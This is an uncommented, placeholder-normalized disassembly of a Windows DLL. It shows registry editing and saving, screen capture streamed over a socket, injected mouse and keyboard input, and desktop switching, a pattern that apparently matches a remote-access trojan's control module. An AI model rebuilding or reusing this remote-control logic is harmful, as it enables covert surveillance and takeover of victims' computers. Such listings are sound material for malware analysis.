jmp r-xdata
pop edi
pop esi
mov eax 0x80000003
pop ebx
add esp 0x20c
retn
mov eax [ esp + 0xc ]
pop edi
pop esi
pop ebx
add esp 0x20c
retn
mov edx 0x80000005
pop edi
pop esi
mov eax 0x80000005
pop ebx
add esp 0x20c
retn
sub_10005d50
sub esp 0x108
mov eax [ esp + 0x10c ]
push ebx
push ebp
push esi
push 0x9
mov [ esp + 0x10 ] ecx
push eax
call sub_10005aa0
mov ebp eax
add esp 0x8
cmp ebp 0xffffffff
jne r-xdata
push 0x104
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x108
retn 0x4
push edi
mov ecx 0x41
xor eax eax
mov edi ebx
[ edi ]
mov ecx 0x40
lea edi [ esp + 0x15 ]
mov [ esp + 0x14 ] al
lea edx [ esp + 0x14 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push ebx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push 0x80
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push 0x1
push eax
and ecx 0x3
push 0x1
lea eax [ esp + 0x2c ]
push 0x40000000
push eax
[ edi ] [ esi ]
call sub_10002d60
add esp 0x20
mov esi eax
cmp esi 0xffffffff
pop edi
push ebp
jne r-xdata
push ebp
call [ RegCloseKey@IAT ]
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x108
retn 0x4
mov ecx [ esp + 0x10 ]
push esi
call sub_100057d0
push ebp
call [ RegCloseKey@IAT ]
push esi
call [ CloseHandle@IAT ]
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x108
retn 0x4
call [ RegCloseKey@IAT ]
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x108
retn 0x4
sub_10005e80
push esi
push edi
mov edi [ esp + 0x14 ]
cmp edi 0x11
jne r-xdata
mov edx [ esp + 0xc ]
push 0x2
push edx
call sub_10005aa0
mov esi eax
add esp 0x8
cmp esi 0xffffffff
je r-xdata
mov eax [ esp + 0xc ]
push 0x4
push eax
call sub_10005aa0
mov esi eax
add esp 0x8
cmp esi 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn 0x14
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
push eax
push ecx
push edi
push 0x0
push edx
push esi
call [ RegSetValueExA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0xc ]
push ecx
push edx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
push eax
push esi
call [ RegCreateKeyExA@IAT ]
test eax eax
jne r-xdata
push esi
call [ RegCloseKey@IAT ]
push esi
call [ RegCloseKey@IAT ]
pop edi
mov eax 0x1
pop esi
retn 0x14
mov ecx [ esp + 0xc ]
mov edi [ RegCloseKey@IAT ]
push ecx
call edi
push esi
call edi
pop edi
mov eax 0x1
pop esi
retn 0x14
sub_10005f40
mov eax [ esp + 0xc ]
push esi
cmp eax 0x11
push 0x2
jne r-xdata
mov edx [ esp + 0xc ]
push edx
call sub_10005aa0
mov esi eax
add esp 0x8
cmp esi 0xffffffff
je r-xdata
mov eax [ esp + 0xc ]
push eax
call sub_10005aa0
mov esi eax
add esp 0x8
cmp esi 0xffffffff
je r-xdata
xor eax eax
pop esi
retn 0xc
mov eax [ esp + 0xc ]
push eax
push esi
call [ RegDeleteValueA@IAT ]
test eax eax
push esi
jne r-xdata
mov ecx [ esp + 0xc ]
push ecx
push esi
call [ RegDeleteKeyA@IAT ]
test eax eax
push esi
jne r-xdata
call [ RegCloseKey@IAT ]
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
retn 0xc
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
retn 0xc
sub_10005fd0
sub esp 0x104
push ebx
push esi
push 0x104
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
pop esi
xor eax eax
pop ebx
add esp 0x104
retn 0x4
push ebp
push edi
mov ecx 0x41
xor eax eax
mov edi ebx
lea edx [ esp + 0x10 ]
[ edi ]
mov ecx 0x40
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] al
push ebx
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x14 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push 0x80
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
push 0x1
push eax
and ecx 0x3
push 0x1
lea eax [ esp + 0x28 ]
push 0x40000000
push eax
[ edi ] [ esi ]
call sub_10002d60
add esp 0x20
cmp eax 0xffffffff
pop edi
pop ebp
jne r-xdata
push eax
call [ CloseHandle@IAT ]
push ebx
call sub_10002a70
mov ecx [ esp + 0x114 ]
push 0xf003f
push ecx
call sub_10005aa0
mov esi eax
add esp 0xc
cmp esi 0xffffffff
jne r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop esi
pop ebx
add esp 0x104
retn 0x4
push 0x0
push ebx
push esi
call [ RegSaveKeyA@IAT ]
test eax eax
push esi
jne r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop esi
pop ebx
add esp 0x104
retn 0x4
call [ RegCloseKey@IAT ]
call [ RegCloseKey@IAT ]
mov eax ebx
pop esi
pop ebx
add esp 0x104
retn 0x4
sub_10006120
mov eax [ esp + 0x4 ]
push esi
push 0x2
push eax
call sub_10005aa0
mov esi eax
add esp 0x8
cmp esi 0xffffffff
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push 0x0
push ecx
push esi
call [ RegSetValueExA@IAT ]
test eax eax
push esi
je r-xdata
xor eax eax
pop esi
retn 0x14
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
retn 0x14
call [ RegCloseKey@IAT ]
xor eax eax
pop esi
retn 0x14
sub_10006180
mov eax [ esp + 0x8 ]
sub esp 0xc
add eax 0xfffffffe
push ebx
push ebp
push esi
cmp eax 0x5
push edi
ja r-xdata
mov [ esp + 0x14 ] r--data
jmp [ eax * 4 + jump_table_100063cc ]
mov ecx [ esp + 0x28 ]
push ecx
lea ecx [ esp + 0x2c ]
call sub_10005d50
mov esi eax
test esi esi
jne r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ eax + 0x4 ]
mov ebx [ eax ]
lea edx [ eax + 0x8 ]
mov [ esp + 0x28 ] ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea esi [ ecx + edx + 0x1 ]
or ecx 0xffffffff
mov edi esi
[ edi ]
not ecx
dec ecx
mov edi edx
mov ebp ecx
or ecx 0xffffffff
[ edi ]
not ecx
mov eax edx
dec ecx
add eax ebp
lea eax [ ecx + eax + 0x2 ]
mov ecx [ esp + 0x28 ]
push ecx
push eax
push ebx
push esi
push edx
lea ecx [ esp + 0x3c ]
call sub_10005e80
jmp r-xdata
mov edx [ esp + 0x28 ]
or ecx 0xffffffff
xor eax eax
mov esi [ edx ]
add edx 0x4
mov edi edx
push esi
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
lea ecx [ esp + 0x2c ]
push eax
push edx
call sub_10005f40
test eax eax
jne r-xdata
mov edx [ esp + 0x28 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
lea ecx [ esp + 0x28 ]
push eax
push edx
call sub_10005fc0
test eax eax
jne r-xdata
mov edx [ esp + 0x28 ]
lea ecx [ esp + 0x28 ]
push edx
call sub_10005fd0
mov esi eax
test esi esi
jne r-xdata
mov eax [ esp + 0x28 ]
or ecx 0xffffffff
mov edx [ eax + 0x4 ]
mov ebx [ eax ]
mov [ esp + 0x28 ] edx
lea edx [ eax + 0x8 ]
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
lea esi [ ecx + edx + 0x1 ]
or ecx 0xffffffff
mov edi esi
[ edi ]
not ecx
dec ecx
mov edi edx
mov ebp ecx
or ecx 0xffffffff
[ edi ]
not ecx
mov eax edx
dec ecx
add eax ebp
lea eax [ ecx + eax + 0x2 ]
mov ecx [ esp + 0x28 ]
push ecx
push eax
push ebx
push esi
push edx
lea ecx [ esp + 0x3c ]
call sub_10006120
mov eax [ esp + 0x20 ]
lea edx [ esp + 0x10 ]
push edx
mov [ esp + 0x14 ] 0x3
mov [ esp + 0x1c ] esi
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x14 ] eax
jmp r-xdata
test eax eax
jne r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0x14 ] eax
jmp r-xdata
mov ecx [ esp + 0x20 ]
lea eax [ esp + 0x10 ]
push eax
push ecx
mov [ esp + 0x18 ] 0x1
call sub_10003930
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
call [ GetLastError@IAT ]
mov [ esp + 0x14 ] eax
jmp r-xdata
mov ecx [ esp + 0x20 ]
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x14 ] 0x3
mov [ esp + 0x1c ] esi
push ecx
call [ GetLastError@IAT ]
mov [ esp + 0x14 ] eax
jmp r-xdata
mov eax [ esp + 0x20 ]
lea edx [ esp + 0x10 ]
push edx
push eax
mov [ esp + 0x18 ] 0x1
call sub_10003930
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
call [ GetLastError@IAT ]
mov [ esp + 0x14 ] eax
jmp r-xdata
call sub_10003930
push esi
call sub_10002a70
push esi
call [ free@IAT ]
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov [ esp + 0x10 ] 0x0
mov edx [ esp + 0x20 ]
lea ecx [ esp + 0x10 ]
push ecx
push edx
call sub_10003930
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
sub_100063f0
push 0xffffffff
push sub_1006b14b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
lea ecx [ esi + 0x38 ]
call sub_100049a0
xor edi edi
push 0xffff
mov [ esp + 0x18 ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
call ??2@YAPAXI@Z
add esp 0x4
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
push edi
push edi
push 0x1
push edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call [ CreateEventA@IAT ]
mov ecx [ esp + 0xc ]
mov [ esi + 0x30 ] eax
mov eax [ esi + 0x1c ]
pop edi
mov [ esi ] eax
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_10006470
push 0xffffffff
push sub_1006b16b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov eax [ esi + 0x30 ]
mov [ esp + 0x10 ] 0x0
push eax
call [ CloseHandle@IAT ]
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ esi + 0x1c ]
push eax
call ??3@YAXPAX@Z
mov ecx [ esi + 0x48 ]
add esp 0x4
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
lea ecx [ esi + 0x38 ]
mov [ esp + 0x10 ] 0xffffffff
call j_sub_10004af0
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_10006510
push ebx
push esi
push edi
push 0x0
push 0x0
push 0x0
push rw-data
call [ CreateDCA@IAT ]
mov edi [ GetDeviceCaps@IAT ]
mov esi eax
push 0x8
push esi
call edi
push 0xa
push esi
mov ebx eax
call edi
push esi
mov edi eax
call [ DeleteDC@IAT ]
mov eax [ esp + 0x10 ]
mov [ eax ] ebx
mov [ eax + 0x4 ] edi
pop edi
pop esi
pop ebx
retn 0x4
sub_10006550
push ebp
mov ebp esp
push 0xffffffff
push sub_1006b180
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
mov ebx ecx
push esi
push edi
lea esi [ ebx + 0x38 ]
mov [ ebp - 0x10 ] esp
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_10004af0
push 0x0
mov ecx esi
call sub_100049c0
push 0x0
push 0x0
push 0x0
push rw-data
call [ CreateDCA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push edi
call [ CreateCompatibleDC@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ ebx + 0x4 ]
push eax
push ecx
push edi
call [ CreateCompatibleBitmap@IAT ]
test eax eax
je r-xdata
push edi
call [ DeleteDC@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov esi [ DeleteDC@IAT ]
push eax
push esi
call [ SelectObject@IAT ]
test eax eax
mov [ ebp - 0x14 ] eax
je r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
push 0xcc0020
push 0x0
push 0x0
push edi
push edx
push eax
push 0x0
push 0x0
push esi
call [ BitBlt@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x14 ]
push ecx
push esi
call [ SelectObject@IAT ]
mov ebx eax
push esi
mov esi [ DeleteDC@IAT ]
test ebx ebx
je r-xdata
call esi
push edi
call esi
call esi
push edi
call esi
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10006670
mov eax 0x1004
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov ebp ecx
xor esi esi
xor ebx ebx
call sub_10006550
mov [ esp + 0x10 ] eax
mov ecx 0x3ff
xor eax eax
lea edi [ esp + 0x15 ]
mov [ esp + 0x14 ] bl
push 0xf
[ edi ]
stosw [ edi ]
stosb [ edi ]
call [ GetStockObject@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp ]
mov edi [ esp + 0x10 ]
push 0x0
lea ecx [ esp + 0x18 ]
push eax
push ecx
push 0x1
push 0x0
push edi
push esi
call [ GetDIBits@IAT ]
push edi
call [ DeleteObject@IAT ]
test ebx ebx
je r-xdata
push ebx
call [ GetDC@IAT ]
mov esi eax
push ebx
push edi
push esi
call [ SelectPalette@IAT ]
push esi
mov ebx eax
call [ RealizePalette@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1004
retn
push 0x1
push ebx
push esi
call [ SelectPalette@IAT ]
push esi
call [ RealizePalette@IAT ]
push esi
push 0x0
call [ ReleaseDC@IAT ]
sub_10006720
push ebp
mov ebp esp
push 0xffffffff
push sub_1006b190
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
xor esi esi
mov ebx ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x4 ] esi
call sub_10006550
cmp eax esi
mov [ ebp - 0x20 ] eax
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
xor eax eax
lea esi [ ecx + edi ]
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
push 0xf
and ecx 0x3
mov [ ebp - 0x18 ] esi
[ edi ]
call [ GetStockObject@IAT ]
test eax eax
mov [ ebp + 0xc ] eax
je r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx [ ebp + 0x14 ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ edx ] 0x0
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x10
push 0x0
call [ GetDC@IAT ]
mov edi eax
mov eax [ ebp + 0xc ]
push 0x0
push eax
push edi
mov [ ebp - 0x24 ] edi
call [ SelectPalette@IAT ]
push edi
mov [ ebp - 0x28 ] eax
call [ RealizePalette@IAT ]
xor eax eax
mov [ ebp + 0xc ] eax
mov edx [ ebp - 0x20 ]
push edx
call [ DeleteObject@IAT ]
mov eax [ ebp - 0x28 ]
test eax eax
je r-xdata
mov ecx [ ebx ]
mov edx [ ebp - 0x20 ]
push 0x0
push ecx
push esi
push 0x1
push eax
push edx
push edi
call [ GetDIBits@IAT ]
mov eax [ ebx + 0x20 ]
mov edi [ ebp - 0x14 ]
mov ecx eax
xor edx edx
[ esi ] [ edi ]
je r-xdata
mov eax [ ebx ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
add eax ecx
mov ecx [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov [ ecx ] edx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10009442
add esp 0x10
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push 0x1
push eax
push edi
call [ SelectPalette@IAT ]
push edi
call [ RealizePalette@IAT ]
push edi
push 0x0
call [ ReleaseDC@IAT ]
mov ecx [ ebp - 0x14 ]
add ecx eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] ecx
mov ecx 0x32
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
mov edi [ ebp - 0x14 ]
mov [ ecx + eax ] 0x1
mov ecx [ ebx + 0x20 ]
mov eax ecx
mov esi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x20 ]
mov ecx [ ebp - 0x1c ]
add edx eax
add ecx eax
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0x24 ]
mov esi [ ebp - 0x18 ]
inc eax
mov [ ebp + 0xc ] eax
jmp r-xdata
push 0x1
call [ Sleep@IAT ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
sub_100068f0
push ecx
mov eax [ esp + 0x8 ]
push ebx
push esi
mov esi ecx
push eax
mov [ esi + 0x34 ] eax
call sub_1000d7d0
add esp 0x4
mov ecx esi
mov ebx eax
call sub_10006b00
test eax eax
jne r-xdata
mov eax [ esi + 0x34 ]
push eax
call sub_1000d5a0
push ebx
call sub_10004380
add esp 0x8
mov [ esi + 0x34 ] eax
test eax eax
jne r-xdata
pop esi
pop ebx
pop ecx
retn 0x4
mov ecx [ esi + 0x2c ]
mov edx [ esi + 0x1c ]
push ecx
push edx
push eax
call sub_100045c0
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ecx
retn 0x4
lea eax [ esp + 0x8 ]
push eax
push 0x0
push esi
push sub_10006af0
push 0x0
push 0x0
call [ _beginthreadex@IAT ]
add esp 0x18
mov [ esi + 0x48 ] eax
test eax eax
je r-xdata
pop esi
xor eax eax
pop ebx
pop ecx
retn 0x4
mov ecx [ esi + 0x30 ]
push edi
mov edi [ WaitForSingleObject@IAT ]
push 0x0
push ecx
call edi
cmp eax 0x102
jne r-xdata
push eax
call [ CloseHandle@IAT ]
push ebx
call [ closesocket@IAT ]
mov eax [ esi + 0x34 ]
push eax
call sub_1000d5a0
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebx
pop ecx
retn 0x4
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x10 ]
lea edx [ esp + 0x14 ]
push edx
mov edx [ esi + 0x18 ]
push eax
push ecx
push edx
mov ecx esi
call sub_10006720
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov edx [ esi + 0x30 ]
push 0x0
push edx
call edi
cmp eax 0x102
je r-xdata
mov ecx [ esi + 0x34 ]
push eax
mov eax [ esi + 0x18 ]
push eax
push ecx
call sub_100045c0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
sub_10006a00
push 0xffffffff
push sub_1006b1a8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push esi
mov esi ecx
push edi
lea ecx [ esp + 0x10 ]
mov [ esp + 0xc ] 0x0
call sub_100049a0
mov edi [ free@IAT ]
mov [ esp + 0x28 ] 0x0
mov ecx [ esi + 0x30 ]
push ecx
call [ SetEvent@IAT ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x28 ] 0xffffffff
call j_sub_10004af0
mov ecx [ esp + 0x20 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x24
retn
cmp eax 0x1
jne r-xdata
mov edx [ esi + 0x34 ]
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x8 ]
push eax
push ecx
push edx
call sub_100043d0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
lea ecx [ esp + 0x10 ]
call sub_10004af0
push 0x0
lea ecx [ esp + 0x14 ]
call sub_100049c0
mov ecx [ esp + 0x8 ]
mov al [ ecx + 0xb ]
cmp al 0x1
jne r-xdata
cmp al 0x2
jne r-xdata
push ecx
mov ecx esi
call sub_10006c70
mov eax [ esp + 0x8 ]
push eax
call edi
add esp 0x4
jmp r-xdata
cmp al 0x3
jne r-xdata
push ecx
mov ecx esi
call sub_10006cd0
mov eax [ esp + 0x8 ]
push eax
call edi
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x8 ]
push eax
call edi
add esp 0x4
jmp r-xdata
mov ecx esi
call sub_10006d60
sub_10006b00
push ebp
mov ebp esp
push 0xffffffff
push sub_1006b1c0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] esp
xor ebx ebx
mov esi ecx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10006510
mov ecx [ eax ]
mov [ esi + 0x4 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x8 ] edx
mov eax [ esi + 0x4 ]
lea eax [ eax * 8 + 0x1f ]
cdq
and edx 0x1f
add eax edx
mov edx [ esi + 0x8 ]
sar eax 0x5
mov ecx edx
imul ecx eax
shl ecx 0x2
cmp ecx 0x300000
mov [ esi + 0xc ] ecx
ja r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
shl eax 0x2
mov [ esi + 0x20 ] eax
imul eax edx
mov edi [ esi ]
add eax 0x2800
mov [ esi + 0x28 ] eax
mov ecx 0xa
xor eax eax
mov [ esi + 0x24 ] 0x400
mov [ esi + 0x2c ] 0x428
[ edi ]
mov ecx [ esi ]
mov [ ecx ] 0x28
mov edx [ esi ]
mov eax [ esi + 0x4 ]
mov [ edx + 0x4 ] eax
mov ecx [ esi ]
mov edx [ esi + 0x8 ]
mov [ ecx + 0x8 ] edx
mov eax [ esi ]
mov [ eax + 0xc ] 0x1
mov ecx [ esi ]
mov [ ecx + 0xe ] 0x8
mov edx [ esi ]
mov [ edx + 0x10 ] ebx
mov eax [ esi + 0x10 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ esi + 0x18 ]
cmp eax ebx
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ esi + 0xc ]
add eax 0x2800
push eax
call ??2@YAPAXI@Z
mov ecx [ esi + 0xc ]
add esp 0x4
add ecx 0x2800
mov [ esi + 0x10 ] eax
push ecx
call ??2@YAPAXI@Z
mov edx [ esi + 0xc ]
add esp 0x4
add edx 0x2800
mov [ esi + 0x14 ] eax
push edx
call ??2@YAPAXI@Z
add esp 0x4
mov ecx esi
mov [ esi + 0x18 ] eax
call sub_10006670
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_10006c70
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ mouse_event@IAT ]
cmp [ esi + 0x8 ] 0x800
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ esi ]
push edx
push eax
call [ SetCursorPos@IAT ]
mov si [ esi + 0x8 ]
test si si
je r-xdata
mov eax [ esi ]
push 0x0
cmp eax 0x1
jne r-xdata
pop edi
pop esi
retn 0x4
push 0x0
push 0x0
push 0x0
and esi 0xffff
push 0x0
push esi
call edi
mov ecx [ esi + 0x4 ]
neg ecx
push ecx
mov eax [ esi + 0x4 ]
push eax
jmp r-xdata
push 0x0
push 0x0
push 0x800
call edi
sub_10006cd0
push esi
mov esi [ keybd_event@IAT ]
push edi
mov edi [ esp + 0xc ]
cmp [ edi ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x10
call esi
cmp [ edi + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x11
call esi
mov al [ edi + 0xa ]
push 0x0
push 0x0
push 0x0
push eax
call esi
mov cl [ edi + 0xa ]
push 0x0
push 0x2
push 0x0
push ecx
call esi
cmp [ edi ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x12
call esi
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
push 0x10
call esi
cmp [ edi + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x2
push 0x0
push 0x11
call esi
pop edi
pop esi
retn 0x4
push 0x0
push 0x2
push 0x0
push 0x12
call esi
sub_10006d60
sub esp 0x8
push ebx
push ebp
push esi
push edi
call [ GetProcessWindowStation@IAT ]
test eax eax
mov [ esp + 0x10 ] eax
jne r-xdata
call [ GetCurrentThreadId@IAT ]
push eax
call [ GetThreadDesktop@IAT ]
test eax eax
mov [ esp + 0x14 ] eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push 0x37f
push 0x0
push rw-data
call [ OpenWindowStationA@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov edi [ SetProcessWindowStation@IAT ]
push ebp
call edi
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push 0x1ff
push 0x0
push 0x0
push rw-data
call [ OpenDesktopA@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ebx [ SetThreadDesktop@IAT ]
push esi
call ebx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push 0x2e0003
push 0x0
push 0x312
push 0xffff
call [ PostMessageA@IAT ]
mov eax [ esp + 0x10 ]
push eax
call edi
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ecx [ esp + 0x14 ]
push ecx
call ebx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push ebp
call [ CloseWindowStation@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push esi
call [ CloseDesktop@IAT ]
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
add esp 0x8
retn
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
sub_10006e70
push 0xffffffff
push sub_1006b1d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4c
mov eax [ esp + 0x5c ]
push esi
push eax
mov esi [ eax ]
call [ free@IAT ]
add esp 0x4
lea ecx [ esp + 0x4 ]
call sub_100063f0
push esi
lea ecx [ esp + 0x8 ]
mov [ esp + 0x5c ] 0x0
call sub_100068f0
